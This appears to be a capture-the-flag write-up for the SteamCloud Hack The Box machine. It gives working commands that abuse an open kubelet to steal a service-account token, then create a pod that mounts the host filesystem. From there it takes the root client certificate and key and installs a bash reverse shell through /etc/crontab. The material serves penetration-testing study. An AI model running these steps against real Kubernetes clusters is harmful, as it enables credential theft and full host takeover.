# Target
| Category          | Details                                               |
|-------------------|-------------------------------------------------------|
| 📝 **Name**       | [SteamCloud](https://app.hackthebox.com/machines/443) |  
| 🏷 **Type**       | HTB Machine                                           |
| 🖥 **OS**         | Linux                                                 |
| 🎯 **Difficulty** | Easy                                                  |
| 📁 **Tags**       | k8s, kubernetes, SA token exfiltration, pod creation  |

# Scan
```
PORT      STATE SERVICE          VERSION
22/tcp    open  ssh              OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
| ssh-hostkey: 
|   2048 fc:fb:90:ee:7c:73:a1:d4:bf:87:f8:71:e8:44:c6:3c (RSA)
|   256 46:83:2b:1b:01:db:71:64:6a:3e:27:cb:53:6f:81:a1 (ECDSA)
|_  256 1d:8d:d3:41:f3:ff:a4:37:e8:ac:78:08:89:c2:e3:c5 (ED25519)
2379/tcp  open  ssl/etcd-client?
| tls-alpn: 
|_  h2
| ssl-cert: Subject: commonName=steamcloud
| Subject Alternative Name: DNS:localhost, DNS:steamcloud, IP Address:10.129.81.64, IP Address:127.0.0.1, IP Address:0:0:0:0:0:0:0:1
| Not valid before: 2025-10-22T15:13:59
|_Not valid after:  2026-10-22T15:13:59
|_ssl-date: TLS randomness does not represent time
2380/tcp  open  ssl/etcd-server?
| ssl-cert: Subject: commonName=steamcloud
| Subject Alternative Name: DNS:localhost, DNS:steamcloud, IP Address:10.129.81.64, IP Address:127.0.0.1, IP Address:0:0:0:0:0:0:0:1
| Not valid before: 2025-10-22T15:13:59
|_Not valid after:  2026-10-22T15:13:59
| tls-alpn: 
|_  h2
|_ssl-date: TLS randomness does not represent time
8443/tcp  open  ssl/http         Golang net/http server
| tls-alpn: 
|   h2
|_  http/1.1
|_http-title: Site doesn't have a title (application/json).
| ssl-cert: Subject: commonName=minikube/organizationName=system:masters
| Subject Alternative Name: DNS:minikubeCA, DNS:control-plane.minikube.internal, DNS:kubernetes.default.svc.cluster.local, DNS:kubernetes.default.svc, DNS:kubernetes.default, DNS:kubernetes, DNS:localhost, IP Address:10.129.81.64, IP Address:10.96.0.1, IP Address:127.0.0.1, IP Address:10.0.0.1
| Not valid before: 2025-10-21T15:13:58
|_Not valid after:  2028-10-21T15:13:58
| fingerprint-strings: 
|   FourOhFourRequest: 
|     HTTP/1.0 403 Forbidden
|     Audit-Id: b4c9c12c-a7df-49de-8ebd-4d1506d30121
|     Cache-Control: no-cache, private
|     Content-Type: application/json
|     X-Content-Type-Options: nosniff
|     X-Kubernetes-Pf-Flowschema-Uid: adeda09f-2327-4af6-915a-20cef95d5b90
|     X-Kubernetes-Pf-Prioritylevel-Uid: 42df9739-570c-4499-a168-b364ac708874
|     Date: Wed, 22 Oct 2025 15:35:04 GMT
|     Content-Length: 212
|     {"kind":"Status","apiVersion":"v1","metadata":{},"status":"Failure","message":"forbidden: User "system:anonymous" cannot get path "/nice ports,/Trinity.txt.bak"","reason":"Forbidden","details":{},"code":403}
|   GetRequest: 
|     HTTP/1.0 403 Forbidden
|     Audit-Id: 68bdae78-acb8-4f47-99ee-64009c2a220e
|     Cache-Control: no-cache, private
|     Content-Type: application/json
|     X-Content-Type-Options: nosniff
|     X-Kubernetes-Pf-Flowschema-Uid: adeda09f-2327-4af6-915a-20cef95d5b90
|     X-Kubernetes-Pf-Prioritylevel-Uid: 42df9739-570c-4499-a168-b364ac708874
|     Date: Wed, 22 Oct 2025 15:35:03 GMT
|     Content-Length: 185
|     {"kind":"Status","apiVersion":"v1","metadata":{},"status":"Failure","message":"forbidden: User "system:anonymous" cannot get path "/"","reason":"Forbidden","details":{},"code":403}
|   HTTPOptions: 
|     HTTP/1.0 403 Forbidden
|     Audit-Id: 7e6b15b1-8900-4c76-9397-29a3f9fe8ef2
|     Cache-Control: no-cache, private
|     Content-Type: application/json
|     X-Content-Type-Options: nosniff
|     X-Kubernetes-Pf-Flowschema-Uid: adeda09f-2327-4af6-915a-20cef95d5b90
|     X-Kubernetes-Pf-Prioritylevel-Uid: 42df9739-570c-4499-a168-b364ac708874
|     Date: Wed, 22 Oct 2025 15:35:03 GMT
|     Content-Length: 189
|_    {"kind":"Status","apiVersion":"v1","metadata":{},"status":"Failure","message":"forbidden: User "system:anonymous" cannot options path "/"","reason":"Forbidden","details":{},"code":403}
|_ssl-date: TLS randomness does not represent time
10249/tcp open  http             Golang net/http server (Go-IPFS json-rpc or InfluxDB API)
|_http-title: Site doesn't have a title (text/plain; charset=utf-8).
10250/tcp open  ssl/http         Golang net/http server (Go-IPFS json-rpc or InfluxDB API)
| ssl-cert: Subject: commonName=steamcloud@1761146041
| Subject Alternative Name: DNS:steamcloud
| Not valid before: 2025-10-22T14:14:00
|_Not valid after:  2026-10-22T14:14:00
| tls-alpn: 
|   h2
|_  http/1.1
|_ssl-date: TLS randomness does not represent time
|_http-title: Site doesn't have a title (text/plain; charset=utf-8).
10256/tcp open  http             Golang net/http server (Go-IPFS json-rpc or InfluxDB API)
|_http-title: Site doesn't have a title (text/plain; charset=utf-8).
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port8443-TCP:V=7.95%T=SSL%I=7%D=10/22%Time=68F8F9A8%P=x86_64-pc-linux-g
SF:nu%r(GetRequest,22F,"HTTP/1\.0\x20403\x20Forbidden\r\nAudit-Id:\x2068bd
SF:ae78-acb8-4f47-99ee-64009c2a220e\r\nCache-Control:\x20no-cache,\x20priv
SF:ate\r\nContent-Type:\x20application/json\r\nX-Content-Type-Options:\x20
SF:nosniff\r\nX-Kubernetes-Pf-Flowschema-Uid:\x20adeda09f-2327-4af6-915a-2
SF:0cef95d5b90\r\nX-Kubernetes-Pf-Prioritylevel-Uid:\x2042df9739-570c-4499
SF:-a168-b364ac708874\r\nDate:\x20Wed,\x2022\x20Oct\x202025\x2015:35:03\x2
SF:0GMT\r\nContent-Length:\x20185\r\n\r\n{\"kind\":\"Status\",\"apiVersion
SF:\":\"v1\",\"metadata\":{},\"status\":\"Failure\",\"message\":\"forbidde
SF:n:\x20User\x20\\\"system:anonymous\\\"\x20cannot\x20get\x20path\x20\\\"
SF:/\\\"\",\"reason\":\"Forbidden\",\"details\":{},\"code\":403}\n")%r(HTT
SF:POptions,233,"HTTP/1\.0\x20403\x20Forbidden\r\nAudit-Id:\x207e6b15b1-89
SF:00-4c76-9397-29a3f9fe8ef2\r\nCache-Control:\x20no-cache,\x20private\r\n
SF:Content-Type:\x20application/json\r\nX-Content-Type-Options:\x20nosniff
SF:\r\nX-Kubernetes-Pf-Flowschema-Uid:\x20adeda09f-2327-4af6-915a-20cef95d
SF:5b90\r\nX-Kubernetes-Pf-Prioritylevel-Uid:\x2042df9739-570c-4499-a168-b
SF:364ac708874\r\nDate:\x20Wed,\x2022\x20Oct\x202025\x2015:35:03\x20GMT\r\
SF:nContent-Length:\x20189\r\n\r\n{\"kind\":\"Status\",\"apiVersion\":\"v1
SF:\",\"metadata\":{},\"status\":\"Failure\",\"message\":\"forbidden:\x20U
SF:ser\x20\\\"system:anonymous\\\"\x20cannot\x20options\x20path\x20\\\"/\\
SF:\"\",\"reason\":\"Forbidden\",\"details\":{},\"code\":403}\n")%r(FourOh
SF:FourRequest,24A,"HTTP/1\.0\x20403\x20Forbidden\r\nAudit-Id:\x20b4c9c12c
SF:-a7df-49de-8ebd-4d1506d30121\r\nCache-Control:\x20no-cache,\x20private\
SF:r\nContent-Type:\x20application/json\r\nX-Content-Type-Options:\x20nosn
SF:iff\r\nX-Kubernetes-Pf-Flowschema-Uid:\x20adeda09f-2327-4af6-915a-20cef
SF:95d5b90\r\nX-Kubernetes-Pf-Prioritylevel-Uid:\x2042df9739-570c-4499-a16
SF:8-b364ac708874\r\nDate:\x20Wed,\x2022\x20Oct\x202025\x2015:35:04\x20GMT
SF:\r\nContent-Length:\x20212\r\n\r\n{\"kind\":\"Status\",\"apiVersion\":\
SF:"v1\",\"metadata\":{},\"status\":\"Failure\",\"message\":\"forbidden:\x
SF:20User\x20\\\"system:anonymous\\\"\x20cannot\x20get\x20path\x20\\\"/nic
SF:e\x20ports,/Trinity\.txt\.bak\\\"\",\"reason\":\"Forbidden\",\"details\
SF:":{},\"code\":403}\n");
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

# Attack path
1. [Exfiltrate SA token and certificate from `nginx` pod on `nginx` container](#exfiltrate-sa-token-and-certificate-from-nginx-pod-on-nginx-container)
2. [Create pod with host `/` directory mounted using SA token](#using-sa-token-create-pod-with-host--directory-mounted)
3. [Escalate to `root` user using reverse shell spawned with entry added to host `/etc/crontab`](#escalate-to-root-user-using-reverse-shell-spawned-with-entry-added-to-host-etccrontab)

### Exfiltrate SA token and certificate from `nginx` pod on `nginx` container

#### Search for k8s pods/containers vulnerable to RCE
```
┌──(magicrc㉿perun)-[~/attack/HTB SteamCloud]
└─$ kubeletctl --server $TARGET scan rce                                                            
┌─────────────────────────────────────────────────────────────────────────────────────────────────────┐
│                                   Node with pods vulnerable to RCE                                  │
├───┬──────────────┬────────────────────────────────────┬─────────────┬─────────────────────────┬─────┤
│   │ NODE IP      │ PODS                               │ NAMESPACE   │ CONTAINERS              │ RCE │
├───┼──────────────┼────────────────────────────────────┼─────────────┼─────────────────────────┼─────┤
│   │              │                                    │             │                         │ RUN │
├───┼──────────────┼────────────────────────────────────┼─────────────┼─────────────────────────┼─────┤
│ 1 │ 10.129.81.64 │ kube-proxy-9hzsc                   │ kube-system │ kube-proxy              │ +   │
├───┼──────────────┼────────────────────────────────────┼─────────────┼─────────────────────────┼─────┤
│ 2 │              │ storage-provisioner                │ kube-system │ storage-provisioner     │ -   │
├───┼──────────────┼────────────────────────────────────┼─────────────┼─────────────────────────┼─────┤
│ 3 │              │ coredns-78fcd69978-jxt2m           │ kube-system │ coredns                 │ -   │
├───┼──────────────┼────────────────────────────────────┼─────────────┼─────────────────────────┼─────┤
│ 4 │              │ nginx                              │ default     │ nginx                   │ +   │
├───┼──────────────┼────────────────────────────────────┼─────────────┼─────────────────────────┼─────┤
│ 5 │              │ etcd-steamcloud                    │ kube-system │ etcd                    │ -   │
├───┼──────────────┼────────────────────────────────────┼─────────────┼─────────────────────────┼─────┤
│ 6 │              │ kube-apiserver-steamcloud          │ kube-system │ kube-apiserver          │ -   │
├───┼──────────────┼────────────────────────────────────┼─────────────┼─────────────────────────┼─────┤
│ 7 │              │ kube-controller-manager-steamcloud │ kube-system │ kube-controller-manager │ -   │
├───┼──────────────┼────────────────────────────────────┼─────────────┼─────────────────────────┼─────┤
│ 8 │              │ kube-scheduler-steamcloud          │ kube-system │ kube-scheduler          │ -   │
└───┴──────────────┴────────────────────────────────────┴─────────────┴─────────────────────────┴─────┘
```

#### Confirm RCE on `nginx` container
```
┌──(magicrc㉿perun)-[~/attack/HTB SteamCloud]
└─$ kubeletctl --server $TARGET --pod nginx --container nginx --namespace default run "id"          
uid=0(root) gid=0(root) groups=0(root)
```

#### Discover SA secretes mount
```
┌──(magicrc㉿perun)-[~/attack/HTB SteamCloud]
└─$ kubeletctl --server $TARGET --pod nginx --container nginx --namespace default exec 'mount'                                                  
<SNIP>
tmpfs on /run/secrets/kubernetes.io/serviceaccount type tmpfs (ro,relatime,size=4041468k)
<SNIP>
```

#### List SA secrets
```
┌──(magicrc㉿perun)-[~/attack/HTB SteamCloud]
└─$ kubeletctl --server $TARGET --pod nginx --container nginx --namespace default exec 'ls -la /run/secrets/kubernetes.io/serviceaccount'
total 4
drwxrwxrwt 3 root root  140 Oct 24 06:40 .
drwxr-xr-x 3 root root 4096 Oct 23 15:16 ..
drwxr-xr-x 2 root root  100 Oct 24 06:40 ..2025_10_24_06_40_22.444162459
lrwxrwxrwx 1 root root   31 Oct 24 06:40 ..data -> ..2025_10_24_06_40_22.444162459
lrwxrwxrwx 1 root root   13 Oct 23 15:16 ca.crt -> ..data/ca.crt
lrwxrwxrwx 1 root root   16 Oct 23 15:16 namespace -> ..data/namespace
lrwxrwxrwx 1 root root   12 Oct 23 15:16 token -> ..data/token
```

#### Exfiltrate SA token
```
┌──(magicrc㉿perun)-[~/attack/HTB SteamCloud]
└─$ TOKEN=$(kubeletctl --server $TARGET --pod nginx --container nginx --namespace default exec 'cat /run/secrets/kubernetes.io/serviceaccount/token')
```

#### Exfiltrate SA certificate
```
┌──(magicrc㉿perun)-[~/attack/HTB SteamCloud]
└─$ kubeletctl --server $TARGET --pod nginx --container nginx --namespace default exec 'cat /run/secrets/kubernetes.io/serviceaccount/ca.crt' > ca.crt
```

### Using SA token create pod with host `/` directory mounted

#### Discover that SA has permissions to create pods in default namespace on `nginx` container
```
┌──(magicrc㉿perun)-[~/attack/HTB SteamCloud]
└─$ kubectl --server=https://$TARGET:8443 --certificate-authority=ca.crt --token=$TOKEN auth can-i --list --namespace=default
Resources                                       Non-Resource URLs                     Resource Names   Verbs
<SNIP>
pods                                            []                                    []               [get create list]
<SNIP>
```

#### Prepare .yml file for pod with host `/` directory mounted in `/host`
```
┌──(magicrc㉿perun)-[~/attack/HTB SteamCloud]
└─$ cat <<'EOF' > privesc.yml
apiVersion: v1
kind: Pod
metadata:
  name: privesc
  namespace: default
spec:
  containers:
  - name: privesc
    image: nginx:1.14.2
    volumeMounts:
    - mountPath: /host
      name: host-root
  volumes:
  - name: host-root
    hostPath:
       path: /
  automountServiceAccountToken: true
  hostNetwork: true
EOF
```

#### Create pod using prepared .yml file
```
┌──(magicrc㉿perun)-[~/attack/HTB SteamCloud]
└─$ kubectl --server=https://$TARGET:8443 --certificate-authority=ca.crt --token=$TOKEN apply -f privesc.yml
pod/privesc created
```

#### Confirm pod created
```
┌──(magicrc㉿perun)-[~/attack/HTB SteamCloud]
└─$ kubectl --server=https://$TARGET:8443 --certificate-authority=ca.crt --token=$TOKEN get pods            
NAME      READY   STATUS    RESTARTS   AGE
nginx     1/1     Running   0          22h
privesc   1/1     Running   0          67s
```

### Escalate to `root` user using reverse shell spawned with entry added to host `/etc/crontab`

#### Locate kubectl `client-certificate` and `client-key` on host
```
┌──(magicrc㉿perun)-[~/attack/HTB SteamCloud]
└─$ kubeletctl --server $TARGET --pod privesc --container privesc --namespace default run "cat /host/root/.kube/config"
apiVersion: v1
clusters:
- cluster:
    certificate-authority: /root/.minikube/ca.crt
    extensions:
    - extension:
        last-update: Fri, 24 Oct 2025 11:46:18 EDT
        provider: minikube.sigs.k8s.io
        version: v1.24.0
      name: cluster_info
    server: https://10.129.103.98:8443
  name: minikube
contexts:
- context:
    cluster: minikube
    extensions:
    - extension:
        last-update: Fri, 24 Oct 2025 11:46:18 EDT
        provider: minikube.sigs.k8s.io
        version: v1.24.0
      name: context_info
    namespace: default
    user: minikube
  name: minikube
current-context: minikube
kind: Config
preferences: {}
users:
- name: minikube
  user:
    client-certificate: /root/.minikube/profiles/minikube/client.crt
    client-key: /root/.minikube/profiles/minikube/client.key
```

#### Exfiltrate kubectl `client-certificate` and `client-key` from host
```
┌──(magicrc㉿perun)-[~/attack/HTB SteamCloud]
└─$ kubeletctl --server $TARGET --pod privesc --container privesc --namespace default run "cat /host/root/.minikube/profiles/minikube/client.crt" > client.crt

┌──(magicrc㉿perun)-[~/attack/HTB SteamCloud]
└─$ kubeletctl --server $TARGET --pod privesc --container privesc --namespace default run "cat /host/root/.minikube/profiles/minikube/client.key" > client.key
```

#### Confirm full access to cluster using exfiltrated credentials
```
┌──(magicrc㉿perun)-[~/attack/HTB SteamCloud]
└─$ kubectl --server=https://$TARGET:8443 --certificate-authority=ca.crt --client-certificate=client.crt --client-key=client.key auth can-i --list    
Resources                                       Non-Resource URLs   Resource Names   Verbs
*.*                                             []                  []               [*]
<SNIP>
```

#### Start `netcat` to listen for reverse shell connection 
```
┌──(magicrc㉿perun)-[~/attack/HTB SteamCloud]
└─$ nc -lvnp 4444
listening on [any] 4444 ...
```

#### Spawn reverse shell connection by adding entry in `/etc/crontab`
```
┌──(magicrc㉿perun)-[~/attack/HTB SteamCloud]
└─$ kubectl --server=https://$TARGET:8443 --certificate-authority=ca.crt --client-certificate=client.crt --client-key=client.key exec privesc -- sh -c "echo \"/bin/bash -c 'bash -i >& /dev/tcp/10.10.16.23/4444 0>&1'\" > /host/tmp/reverse_shell.sh"
kubectl --server=https://$TARGET:8443 --certificate-authority=ca.crt --client-certificate=client.crt --client-key=client.key exec privesc -- chmod +x /host/tmp/reverse_shell.sh
kubectl --server=https://$TARGET:8443 --certificate-authority=ca.crt --client-certificate=client.crt --client-key=client.key exec privesc -- sh -c "echo \"* * * * * root /tmp/reverse_shell.sh\" >> /host/etc/crontab"
```

#### Confirm escalation
```
connect to [10.10.16.23] from (UNKNOWN) [10.129.96.167] 51924
bash: cannot set terminal process group (4159): Inappropriate ioctl for device
bash: no job control in this shell
root@steamcloud:~# id
id
uid=0(root) gid=0(root) groups=0(root)
```
